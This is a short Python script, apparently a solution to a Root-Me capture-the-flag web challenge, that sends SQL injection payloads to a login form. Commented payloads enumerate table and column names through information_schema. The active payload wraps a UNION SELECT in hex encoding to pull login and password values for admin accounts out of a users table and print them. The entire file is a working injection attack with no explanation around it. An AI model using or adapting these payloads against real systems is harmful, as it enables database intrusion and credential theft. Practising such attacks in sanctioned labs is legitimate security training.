import requests

url = 'http://challenge01.root-me.org/web-serveur/ch49/index.php'
params = {'action':'search'}

#[+] retrieve table name
# payload = "' UNION SELECT 0x" + ("' UNION SELECT 1,table_name from information_schema.tables where table_schema=database()-- -".encode('utf-8')).hex() + "-- -"
#[+] retrieve column name
# payload = "' UNION SELECT 0x" + ("' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name='users'-- -".encode('utf-8')).hex() + "-- -"

payload = "' UNION SELECT 0x" + ("' UNION SELECT login,password FROM users WHERE email LIKE 'admin%'-- -".encode('utf-8')).hex() + "-- -"

data = {'login':payload}

r = requests.post(url, params=params, data=data)

print(r.text)